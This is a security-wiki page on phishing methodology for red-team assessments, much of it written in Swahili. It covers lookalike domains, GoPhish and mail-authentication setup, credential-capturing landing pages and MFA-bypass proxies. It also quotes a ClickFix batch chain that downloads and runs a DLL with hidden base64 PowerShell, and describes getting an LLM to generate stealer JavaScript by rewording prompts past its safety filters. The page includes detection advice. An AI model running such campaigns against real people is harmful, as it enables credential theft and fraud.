# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Recon the victim
1. Select the **victim domain**.
2. Perform some basic web enumeration **searching for login portals** used by the victim and **decide** which one you will **impersonate**.
3. Use some **OSINT** to **find emails**.
2. Prepare the environment
1. **Buy the domain** you are going to use for the phishing assessment
2. **Configure the email service** related records (SPF, DMARC, DKIM, rDNS)
3. Configure the VPS with **gophish**
3. Prepare the campaign
1. Prepare the **email template**
2. Prepare the **web page** to steal the credentials
4. Launch the campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: The domain name **contains** an important **keyword** of the original domain (e.g., zelster.com-management.com).
- **hypened subdomain**: Change the **dot for a hyphen** of a subdomain (e.g., www-zelster.com).
- **New TLD**: Same domain using a **new TLD** (e.g., zelster.org)
- **Homoglyph**: It **replaces** a letter in the domain name with **letters that look similar** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** It **swaps two letters** within the domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Inaongeza au kuondoa “s” mwishoni mwa domain name (e.g., zeltsers.com).
- **Omission**: Inaondoa **herufi moja** kutoka kwenye domain name (e.g., zelser.com).
- **Repetition:** Inarudia moja ya herufi katika domain name (e.g., zeltsser.com).
- **Replacement**: Kama homoglyph lakini si ya siri sana. Inabadilisha moja ya herufi katika domain name, pengine kwa herufi iliyo karibu na herufi asili kwenye keyboard (e.g, zektser.com).
- **Subdomained**: Introduce a **dot** ndani ya domain name (e.g., ze.lster.com).
- **Insertion**: Inserting letter into the domain name (e.g., zerltser.com).
- **Missing dot**: Append the TLD to the domain name. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

There is a **possibility that one of some bits stored or in communication might get automatically flipped** due to various factors like solar flares, cosmic rays, or hardware errors.

When this concept is **applied to DNS requests**, it is possible that the **domain received by the DNS server** is not the same as the domain initially requested.

For example, a single bit modification in the domain "windows.com" can change it to "windnws.com."

Attackers may **take advantage of this by registering multiple bit-flipping domains** that are similar to the victim's domain. Their intention is to redirect legitimate users to their own infrastructure.

For more information read [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

You can search in [https://www.expireddomains.net/](https://www.expireddomains.net) for a expired domain that you could use.\
In order to make sure that the expired domain that you are going to buy **has already a good SEO** you could search how is it categorized in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

In order to **discover more** valid email addresses or **verify the ones** you have already discovered you can check if you can brute-force them smtp servers of the victim. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Moreover, don't forget that if the users use **any web portal to access their mails**, you can check if it's vulnerable to **username brute force**, and exploit the vulnerability if possible.

## Configuring GoPhish

### Installation

You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Download and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\
You will be given a password for the admin user in port 3333 in the output. Therefore, access that port and use those credentials to change the admin password. You may need to tunnel that port to local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuration

**TLS certificate configuration**

Kabla ya hatua hii unapaswa kuwa **tayari umenunua domain** utakayotumia na lazima iwe **inaelekeza** kwa **IP ya VPS** ambako unasanidi **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mipangilio ya Mail**

Anza kusakinisha: `apt-get install postfix`

Kisha ongeza domain kwenye faili zifuatazo:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Badilisha pia thamani za vigezo vifuatavyo ndani ya /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Hatimaye rekebisha faili **`/etc/hostname`** na **`/etc/mailname`** ziwe na jina la domain yako na **anza upya VPS yako.**

Sasa, tengeneza **DNS A record** ya `mail.<domain>` inayoelekeza kwenye **ip address** ya VPS na **DNS MX** record inayoelekeza kwenye `mail.<domain>`

Sasa tujaribu kutuma email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Usanidi wa Gophish**

Simamisha utekelezaji wa gophish na tuisanidi.\
Rekebisha `/opt/gophish/config.json` iwe kama ifuatavyo (zingatia matumizi ya https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Sanidi huduma ya gophish**

Ili kuunda huduma ya gophish ili iweze kuanzishwa kiotomatiki na kudhibitiwa kama huduma unaweza kuunda faili `/etc/init.d/gophish` yenye maudhui yafuatayo:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Maliza kusanidi huduma na ukaikague kwa kufanya:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Kusanidi mail server na domain

### Subiri & kuwa legit

Kadiri domain inavyozeeka ndivyo uwezekano wake wa kuchukuliwa kama spam unavyopungua. Kisha unapaswa kusubiri muda mwingi iwezekanavyo (angalau wiki 1) kabla ya phishing assessment. zaidi ya hayo, ukiiweka page kuhusu reputational sector reputation itakayopatikana itakuwa bora zaidi.

Kumbuka kwamba hata kama unalazimika kusubiri wiki moja unaweza kumaliza kusanidi kila kitu sasa.

### Configure Reverse DNS (rDNS) record

Weka rDNS (PTR) record ambayo hutatua IP address ya VPS kwenda kwenye domain name.

### Sender Policy Framework (SPF) Record

Lazima **usanidi SPF record kwa domain mpya**. Kama hujui SPF record ni nini [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Unaweza kutumia [https://www.spfwizard.net/](https://www.spfwizard.net) kutengeneza SPF policy yako (tumia IP ya VPS machine)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

Huu ndio maudhui ambayo lazima yawekwe ndani ya TXT record ndani ya domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

Lazima **usanidi DMARC record kwa domain mpya**. Ikiwa hujui DMARC record ni nini [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Unapaswa kuunda DNS TXT record mpya inayolenga hostname `_dmarc.<domain>` ikiwa na maudhui yafuatayo:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Lazima **usanidi DKIM kwa domain mpya**. Ikiwa hujui DMARC record ni nini [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Mwongozo huu unategemea: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Unahitaji kuunganisha thamani zote mbili za B64 ambazo DKIM key hutengeneza:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Jaribu alama ya usanidi wa barua pepe yako

Unaweza kufanya hivyo kwa kutumia [https://www.mail-tester.com/](https://www.mail-tester.com)\
Fungua tu ukurasa na tuma barua pepe kwenda anwani wanayokupa:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Unaweza pia **kagua usanidi wako wa email** kwa kutuma email kwa `check-auth@verifier.port25.com` na **kusoma response** (kwa hili utahitaji **kufungua** port **25** na kuona response katika file _/var/mail/root_ ikiwa utatuma email kama root).\
Hakikisha kwamba unapita vipimo vyote:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Unaweza pia kutuma **message kwenda Gmail unaoidhibiti**, kisha uangalie **headers za email** kwenye inbox yako ya Gmail, `dkim=pass` inapaswa kuwepo kwenye field ya `Authentication-Results` ya header.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

The page [www.mail-tester.com](https://www.mail-tester.com) inaweza kukuonyesha ikiwa domain yako inazuiwa na spamhouse. Unaweza kuomba domain/IP yako iondolewe kwenye: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​Unaweza kuomba domain/IP yako iondolewe kwenye [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Weka **jina la kutambua** sender profile
- Amua ni akaunti gani utatumia kutuma phishing emails. Mapendekezo: _noreply, support, servicedesk, salesforce..._
- Unaweza kuacha username na password tupu, lakini hakikisha umeweka alama kwenye Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Inapendekezwa kutumia kipengele cha "**Send Test Email**" ili kujaribu kwamba kila kitu kinafanya kazi.\
> Ningependekeza **kutuma test emails kwenye 10min mails addresses** ili kuepuka kuwekwa kwenye blacklist wakati wa kufanya majaribio.

### Email Template

- Weka **jina la kutambua** template
- Kisha andika **subject** (hakuna ajabu, kitu tu ambacho unaweza kutarajia kusoma kwenye email ya kawaida)
- Hakikisha umechagua "**Add Tracking Image**"
- Andika **email template** (unaweza kutumia variables kama ilivyo kwenye mfano ufuatao):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **ili kuongeza uaminifu wa email**, inapendekezwa kutumia signature fulani kutoka kwa email ya client. Mapendekezo:

- Tuma email kwa **anwani isiyokuwepo** na angalia kama response ina signature yoyote.
- Tafuta **public emails** kama info@ex.com au press@ex.com au public@ex.com na utume email kisha subiri response.
- Jaribu kuwasiliana na **some valid discovered** email na subiri response

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> The Email Template also allows to **attach files to send**. If you would also like to steal NTLM challenges using some specially crafted files/documents [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Andika **jina**
- **Andika HTML code** ya web page. Kumbuka kuwa unaweza **ku-import** web pages.
- Weka alama **Capture Submitted Data** na **Capture Passwords**
- Weka **redirection**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Kawaida utahitaji kurekebisha HTML code ya page na kufanya majaribio kwenye local (labda kwa kutumia Apache server fulani) **mpaka uridhike na matokeo.** Kisha, andika HTML code hiyo kwenye box.\
> Kumbuka kwamba ukihitaji **kutumia static resources** kwa HTML (labda baadhi ya CSS na JS pages) unaweza kuzihifadhi katika _**/opt/gophish/static/endpoint**_ na kisha kuzifikia kutoka _**/static/\<filename>**_

> [!TIP]
> Kwa ajili ya redirection unaweza **kuwaelekeza users kwenye legit main web page** ya victim, au kuwaelekeza kwenye _/static/migration.html_ kwa mfano, weka **spinning wheel (**[**https://loading.io/**](https://loading.io)**) kwa sekunde 5 kisha onyesha kwamba process ilifanikiwa**.

### Users & Groups

- Weka jina
- **Import data** (kumbuka kwamba ili kutumia template kwa mfano unahitaji firstname, last name na email address ya kila user)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Hatimaye, tengeneza campaign ukichagua jina, email template, landing page, URL, sending profile na group. Kumbuka kwamba URL itakuwa link itakayotumwa kwa victims

Kumbuka kwamba **Sending Profile inaruhusu kutuma test email kuona jinsi final phishing email itakavyoonekana**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Ningependekeza **kutuma test emails kwa 10min mails addresses** ili kuepuka kuwekewa blacklist wakati wa kufanya majaribio.

Mara kila kitu kikiwa tayari, anza tu campaign!

## Website Cloning

Kama kwa sababu yoyote unataka clone website angalia page ifuatayo:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Katika baadhi ya phishing assessments (hasa kwa Red Teams) utataka pia **kutuma files zenye aina fulani ya backdoor** (labda C2 au labda kitu tu ambacho kita-trigger authentication).\
Angalia page ifuatayo kwa baadhi ya mifano:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Shambulizi la awali ni la akili sana kwa kuwa unaghushi website halisi na kukusanya taarifa zilizowekwa na user. Kwa bahati mbaya, kama user hajaweka password sahihi au kama application uliyoghushi imekonfigiwa na 2FA, **taarifa hii haitakuruhusu kujifanya user aliyetapeliwa**.

Hapa ndipo tools kama [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) na [**muraena**](https://github.com/muraenateam/muraena) zinapokuwa muhimu. Tool hii itakuruhusu kuzalisha attack inayofanana na MitM. Kimsingi, shambulizi hufanya kazi kwa njia ifuatayo:

1. Wewe **unajifanya login** form ya real webpage.
2. User **anatuma** **credentials** zake kwenye fake page yako na tool inazituma hizo kwa real webpage, **ikiangalia kama credentials zinafanya kazi**.
3. Kama account imekonfigiwa na **2FA**, page ya MitM itaiomba na user **akiiingiza** tool itaituma kwa real web page.
4. Mara user anapothibitishwa wewe (kama attacker) utakuwa **umekamata credentials, 2FA, cookie na taarifa zozote** za kila interaction yako wakati tool inaendesha MitM.

### Via VNC

Je, kama badala ya **kutuma victim kwenye malicious page** yenye muonekano sawa na ya asili, unamtuma kwenye **VNC session yenye browser iliyounganishwa na real web page**? Utaweza kuona anachofanya, kuiba password, MFA iliyotumika, cookies...\
Unaweza kufanya hili kwa [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Ni wazi mojawapo ya njia bora za kujua kama umebainika ni **kutafuta domain yako ndani ya blacklists**. Kama inaonekana imeorodheshwa, kwa namna fulani domain yako iligunduliwa kuwa ya shaka.\
Njia rahisi ya kuangalia kama domain yako inaonekana kwenye blacklist yoyote ni kutumia [https://malwareworld.com/](https://malwareworld.com)

Hata hivyo, zipo njia nyingine za kujua kama victim **anaangalia kwa bidii suspicious phishing activity in the wild** kama ilivyoelezwa katika:


{{#ref}}
detecting-phising.md
{{#endref}}

Unaweza **kununua domain yenye jina linalofanana sana** na domain ya victims **na/au kuzalisha certificate** kwa ajili ya **subdomain** ya domain inayodhibitiwa na wewe **yenye** **keyword** ya domain ya victim. Kama **victim** akifanya aina yoyote ya **DNS au HTTP interaction** nayo, utajua kwamba **anaangalia kwa bidii** domains za shaka na utahitaji kuwa stealth sana.

### Evaluate the phishing

Tumia [**Phishious** ](https://github.com/Rices/Phishious)kuelewa kama email yako itaishia kwenye spam folder au itazuiwa au kufanikiwa.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion sets increasingly skip email lures entirely and **directly target the service-desk / identity-recovery workflow** to defeat MFA.  The attack is fully "living-off-the-land": once the operator owns valid credentials they pivot with built-in admin tooling – no malware is required.

### Attack flow
1. Recon the victim
* Kukusanya personal & corporate details kutoka LinkedIn, data breaches, public GitHub, n.k.
* Kutambua high-value identities (executives, IT, finance) na kuorodhesha **exact help-desk process** ya password / MFA reset.
2. Real-time social engineering
* Kupiga simu, Teams au chat help-desk huku ukijifanya target (mara nyingi kwa kutumia **spoofed caller-ID** au **cloned voice**).
* Kutoa PII iliyokusanywa awali ili kupita knowledge-based verification.
* Kumshawishi agent **abadilisha MFA secret** au afanye **SIM-swap** kwenye registered mobile number.
3. Immediate post-access actions (≤60 min in real cases)
* Kuweka foothold kupitia web SSO portal yoyote.
* Kuorodhesha AD / AzureAD kwa built-ins (hakuna binaries zinazoachwa):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement kwa kutumia **WMI**, **PsExec**, au halali **RMM** agents ambazo tayari zimewhitelisted kwenye environment.

### Detection & Mitigation
* Chukulia help-desk identity recovery kama **privileged operation** – hitaji step-up auth & manager approval.
* Deploy **Identity Threat Detection & Response (ITDR)** / **UEBA** rules zinazoonya kuhusu:
* MFA method changed + authentication kutoka new device / geo.
* Immediate elevation ya principal yuleyule (user-→-admin).
* Rekodi help-desk calls na utekeleze **call-back kwenda kwenye number ambayo tayari imesajiliwa** kabla ya reset yoyote.
* Implement **Just-In-Time (JIT) / Privileged Access** ili accounts zilizowekwa upya kwa sasa **zisipokee moja kwa moja high-privilege tokens**.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews huongeza gharama ya high-touch ops kwa mashambulizi ya wingi yanayofanya **search engines & ad networks kuwa delivery channel**.

1. **SEO poisoning / malvertising** husukuma fake result kama `chromium-update[.]site` juu ya search ads.
2. Victim hupakua small **first-stage loader** (mara nyingi JS/HTA/ISO).  Mifano iliyoonekana na Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader hutoa browser cookies + credential DBs, kisha huvuta **silent loader** ambayo huamua – *kwa realtime* – kama itapeleka:
* RAT (k.m. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Zuia newly-registered domains & tekeleza **Advanced DNS / URL Filtering** kwenye *search-ads* pamoja na e-mail.
* Weka kikomo cha software installation kwenye signed MSI / Store packages, zuia utekelezaji wa `HTA`, `ISO`, `VBS` kwa policy.
* Fuatilia child processes za browsers zinazofungua installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Tafuta LOLBins zinazotumiwa mara kwa mara vibaya na first-stage loaders (k.m. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: cloned national CERT advisory yenye kitufe cha **Update** kinachoonyesha step-by-step “fix” instructions. Victims wanaambiwa waendeshe batch inayopakua DLL na kuitekeleza kupitia `rundll32`.
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` huweka payload kwenye `%TEMP%`, usingizi mfupi huficha network jitter, kisha `rundll32` huita exported entrypoint (`notepad`).
* DLL hufanya beacon ya host identity na ku-poll C2 kila baada ya dakika chache. Remote tasking huja kama **base64-encoded PowerShell** inayotekelezwa hidden na policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Hii hudumisha flexibility ya C2 (server inaweza kubadilisha tasks bila kusasisha DLL) na huficha console windows. Tafuta children za PowerShell za `rundll32.exe` zinazotumia `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` pamoja.
* Defenders wanaweza kutafuta HTTP(S) callbacks za umbo `...page.php?tynor=<COMPUTER>sss<USER>` na polling intervals za dakika 5 baada ya DLL kupakiwa.

---

## AI-Enhanced Phishing Operations
Attackers sasa huunganisha **LLM & voice-clone APIs** kwa lures zilizobinafsishwa kabisa na interaction ya realtime.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS zenye wording ya kubadilishwa & tracking links.|
|Generative AI|Produce *one-off* emails zikirejea public M&A, inside jokes kutoka social media; deep-fake CEO voice kwenye callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Ongeza **dynamic banners** zinazoonyesha messages zilizotumwa kutoka untrusted automation (kupitia ARC/DKIM anomalies).
• Deploy **voice-biometric challenge phrases** kwa high-risk phone requests.
• Endelea ku-simulate AI-generated lures kwenye awareness programmes – static templates zimepitwa na wakati.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attackers can ship benign-looking HTML and **generate the stealer at runtime** by asking a **trusted LLM API** for JavaScript, then executing it in-browser (e.g., `eval` or dynamic `<script>`).

1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings in the prompt; iterate wording to bypass safety filters and reduce hallucinations.
2. **Client-side API call:** on load, JS calls a public LLM (Gemini/DeepSeek/etc.) or a CDN proxy; only the prompt/API call is present in static HTML.
3. **Assemble & exec:** concatenate the response and execute it (polymorphic per visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** code iliyozalishwa hu-personalise lure (k.m. LogoKit token parsing) na kutuma creds kwenye prompt-hidden endpoint.

**Evasion traits**
- Traffic hugonga well-known LLM domains au reputable CDN proxies; wakati mwingine kupitia WebSockets hadi backend.
- Hakuna static payload; malicious JS ipo tu baada ya render.
- Non-deterministic generations huproduce **unique** stealers kwa kila session.

**Detection ideas**
- Endesha sandboxes na JS enabled; flag **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Tafuta front-end POSTs kwenda LLM APIs mara moja zikifuatwa na `eval`/`Function` kwenye returned text.
- Weka alert kwa unsanctioned LLM domains kwenye client traffic pamoja na credential POSTs zinazofuata.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Mbali na classic push-bombing, operators hufanya tu **forced new MFA registration** wakati wa help-desk call, hivyo ku-nullify token ya awali ya user.  Prompt yoyote ya kuingia baadaye huonekana halali kwa victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Fuatilia matukio ya AzureAD/AWS/Okta ambapo **`deleteMFA` + `addMFA`** hutokea **ndani ya dakika chache kutoka kwa IP ile ile**.



## Clipboard Hijacking / Pastejacking

Washambuliaji wanaweza kunakili kimyakimya amri hasidi kwenye clipboard ya mwathiriwa kutoka kwa ukurasa wa wavuti ulioathiriwa au uliotumia typosquatting, kisha kumlaghai mtumiaji azibandike ndani ya **Win + R**, **Win + X** au dirisha la terminal, na kutekeleza code yoyote bila kupakua au kiambatisho.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Ukurasa wa mtego (kwa mfano, channel bandia ya wizara/CERT) unaonyesha QR ya WhatsApp Web/Desktop na kumwagiza mwathiriwa aiskani, kwa kimyakimya ukimwongeza mshambulizi kama **linked device**.
* Mshambulizi hupata mara moja mwonekano wa chat/contact hadi session iondolewe. Waathiriwa huenda baadaye wakaona notisi ya “new device linked”; watetezi wanaweza kuwinda matukio yasiyotarajiwa ya device-link muda mfupi baada ya ziara kwenye kurasa za QR zisizoaminika.

### Mobile‑gated phishing to evade crawlers/sandboxes
Waendeshaji wanazidi kuweka phishing flows zao nyuma ya ukaguzi rahisi wa device ili desktop crawlers zisifike kwenye kurasa za mwisho. Muundo wa kawaida ni script ndogo inayopima kama DOM ina uwezo wa touch na kutuma matokeo kwa server endpoint; clients zisizo za mobile hupata HTTP 500 (au ukurasa tupu), huku watumiaji wa mobile wakipata flow kamili.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` mantiki (rahisi):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Tabia ya seva inayoonekana mara nyingi:
- Huweka session cookie wakati wa kupakia mara ya kwanza.
- Hupokea `POST /detect {"is_mobile":true|false}`.
- Hurejesha 500 (au placeholder) kwa GET zinazofuata wakati `is_mobile=false`; hutoa phishing tu ikiwa `true`.

Mbinu za uwindaji na utambuzi:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: mlolongo wa `GET /static/detect_device.js` → `POST /detect` → HTTP 500 kwa non-mobile; njia halali za mobile victim hurejesha 200 zikiwa na HTML/JS ya kufuata.
- Zuia au kagua kwa makini kurasa zinazoweka maudhui kwa masharti ya `ontouchstart` au ukaguzi mwingine wa kifaa unaofanana.

Vidokezo vya ulinzi:
- Endesha crawlers zikiwa na mobile-like fingerprints na JS imewezeshwa ili kufichua content iliyofungwa kwa masharti.
- Toa alert kwa majibu ya 500 ya kutiliwa shaka yanayofuata `POST /detect` kwenye domains zilizosajiliwa hivi karibuni.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
